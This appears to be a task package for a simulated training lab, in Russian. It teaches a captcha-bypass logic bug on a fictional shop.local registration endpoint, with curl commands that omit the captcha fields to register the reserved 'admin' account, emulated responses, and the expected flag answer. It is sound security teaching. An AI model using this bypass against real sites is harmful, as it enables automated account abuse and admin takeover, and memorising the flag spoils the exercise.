@@ -1,0 +1,42 @@
+{
+  "id": "web-logic-core",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{c4ptch4_sk1pp3d_w1th0ut_p4r4m}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход капчи (логический баг)\n\nНа регистрации `shop.local` есть капча. Но сервер проверяет её только\nесли параметр `captcha` вообще пришёл в запросе: нет параметра — нет\nпроверки. Пользуйся этим.\n\n1. С капчей (неверный код):\n   curl -s -X POST https://shop.local/register -d 'captcha_id=c7f1&captcha=ABCD&user=alice&pass=x'\n2. Тот же запрос БЕЗ полей капчи — сервер зарегистрирует пользователя:\n   curl -s -X POST https://shop.local/register -d 'user=alice&pass=x'\n3. Зарезервированный `admin` так тоже создаётся — сервер вернёт флаг.\n4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/register)",
+      "cases": [
+        {
+          "match": "user=admin",
+          "example": "-s -X POST https://shop.local/register -d 'user=admin&pass=x'",
+          "output": "{\"status\":\"ok\",\"user_id\":1,\"user\":\"admin\",\"role\":\"admin\",\"note\":\"captcha not required when param absent\",\"flag\":\"nto{c4ptch4_sk1pp3d_w1th0ut_p4r4m}\"}\n"
+        },
+        {
+          "match": "captcha",
+          "example": "-s -X POST https://shop.local/register -d 'captcha_id=c7f1&captcha=ABCD&user=alice&pass=x'",
+          "output": "{\"error\":\"wrong_captcha\"}\n"
+        },
+        {
+          "match": "register",
+          "example": "-s -X POST https://shop.local/register -d 'user=bob&pass=x'",
+          "output": "{\"status\":\"ok\",\"user\":42,\"role\":\"user\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.local/register.\n"
+    }
+  }
+}
